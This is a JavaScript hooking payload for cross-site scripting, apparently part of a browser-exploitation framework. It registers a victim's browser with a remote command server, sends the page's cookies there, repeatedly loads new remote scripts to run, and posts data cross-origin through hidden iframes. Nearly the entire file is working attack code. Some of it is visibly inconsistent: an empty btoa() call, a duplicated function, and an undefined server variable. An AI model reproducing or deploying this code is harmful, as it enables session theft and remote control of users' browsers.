function xssmin(){}
xssmin();

// global variables
var xss = {};
xss.hide = "display:none;width:0;height:0;";
xss.debug = "";
xss.reg = [];

xss.decrypt = function(text) {
	return btoa();
};

// global debug function
xss.dbg = function (message) { 
	xss.debug += message + ", ";
};

// global function to pass module parameters to modules
xss.opt = function (name) {
	return(xss.reg[name]);
};

// get cookie helper
xss.cookie = {};
xss.cookie.get = function (name) {
	name += "=";
    var ca = document.cookie.split(';');
    for(var i=0; i<ca.length; i++) {
        var c = ca[i].trim();
        if (c.indexOf(name) == 0) return c.substring(name.length,c.length);
    }
    return "";
};

// set cookie helper defaults to the current domain
xss.cookie.set = function (cname, cvalue, exdays) {
	var d = new Date();
	d.setTime(d.getTime() + (exdays*24*60*60*1000));
	var expires = "expires="+d.toGMTString();
	document.cookie = cname + "=" + cvalue + "; " + expires;
};

// alias for document.getElementById(x)
xss.gbi = function (x) {
	return document.getElementById(x);
};
// alias for document.createElement(x)
xss.ce = function (x) {
	return document.createElement(x);
};
// alias for x.setAttribute(k.v);
xss.sa = function (x,k,v) {
	return x.setAttribute(k,v);
};
// remove an element by id
xss.rm = function (id) {
	var e = xss.gbi(id);
	if (e) { e.parentNode.removeChild(e); }
}

// an area for us to add content
xss.getdiv = function () {
	var d = xss.gbi("sploit");
	if (!d) { 
		var d = xss.ce("div");
		xss.sa(d, "id", "sploit");
		xss.sa(d, "style", xss.hide);
		document.body.appendChild(d);
		d = xss.gbi("sploit");
	}
	return d;
};

// remove the workspace area we add content to
xss.cls = function () {
	xss.rm("sploit");
};

// register this browser with the network
xss.reg = function () {
	xss.cs(xss.api + "?reg="+sploitid+"&c="+encodeURIComponent(document.cookie));
};

// send the heartbeat, and debug message and get new JavaScript to execute (if some is waiting)
xss.hb = function() { 
	// only send back heart beat for the top window
	if (window.top==window.self) {
		xss.cs(xss.api+'?id='+sploitid+"&d="+xss.debug);
		xss.debug = "";
	}
};

// add a script to the page
xss.cs = function (s) { 
	var script = xss.ce("script");
	script.type="text/javascript";
	script.src=s;
	var d = xss.getdiv();
	d.appendChild(script);
};

/**
 * create an image. used for genertic GET requests
 * url: url
 * st: style attribute
 * id: element id to append the image to
 * err: onerror function (or false)
 * load: onload function (or false)
 */
xss.ci = function (url, st, id, err, load) { 
	var i = xss.ce('img');
	i.style=st;
	if (err) {
		xss.sa(i, "onerror", err);
	}
	if (load) { 
		xss.sa(i, "onload", load);
	}
	else {
		i.onload = function() { 
			document.body.appendChild(i);
		}
	}
	i.src=url;
};

/**
 * post data to another domain without Ajax (you never know....)
 * XSS Cross Origin Post
 * url: the url to post to
 * data: (dictionary) key value array of data to post
 * a: the api action (usually 'log')
 */
xss.cop = function (url, data) {

	// create elements
	var ifr = xss.ce('iframe');
	var frm = xss.ce('form');
	// set attributes
	xss.sa(ifr, "name", "cspost");
	xss.sa(ifr, "style", xss.hide);
	xss.sa(ifr, "id", "xsscop");

	xss.sa(frm, "action", url);
	xss.sa(frm, "method", "post");
	xss.sa(frm, "target", "cspost");

	// create an input for each post variable
	for (d in data) {
		var e = xss.ce("input");
		xss.sa(e, "type", "hidden");
		xss.sa(e, "name", d);
		xss.sa(e, "value", data[d]);
		frm.appendChild(e);
	}


	// append form to iframe
	ifr.appendChild(frm);

	document.body.appendChild(ifr);
	// submit the form
	frm.submit();
	// remove the frame (we can't read the response anyway due to cross origin policies)
	xss.rm("xsscop");
};

// append content to the sploit div
xss.append = function (t) {
	xss.getdiv().innerHTML+=t;
};

// remove content from the sploit div
xss.cls = function () {
	xss.getdiv().innerHTML+="";
};

// register the browser with the network (IF we are the top most window)
if (window.top==window.self) {
	console.log("HOOKED!");
	window.setTimeout(xss.reg, 50);
	console.log(xss);
}


